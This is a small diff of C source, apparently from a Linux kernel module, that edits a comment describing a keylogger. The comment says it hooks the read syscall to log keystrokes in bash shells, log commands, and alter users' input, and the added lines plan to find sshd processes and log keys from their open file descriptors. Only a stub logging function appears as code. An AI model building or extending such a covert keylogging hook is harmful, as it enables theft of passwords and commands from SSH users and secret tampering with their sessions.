@@ -45,9 +45,11 @@ static int switch_key_logging(void){
 }
 #endif
 
-/*bash is interactive, using read to always read input from stdin, 
+/*bash is interactive, using read to always read input from a tty, 
   we can hook read to keylog bash shells, also used as a command logger for non-interactive shells,
-  can use this function to alter user input and mess a bit with them
+  can use this function to alter user input and mess a bit with them.
+  need to detect a process of sshd, then go to the processes open fd's,
+  then log the keys
 
 static int logger(char *str, int count){
     pr_info("%s", str);
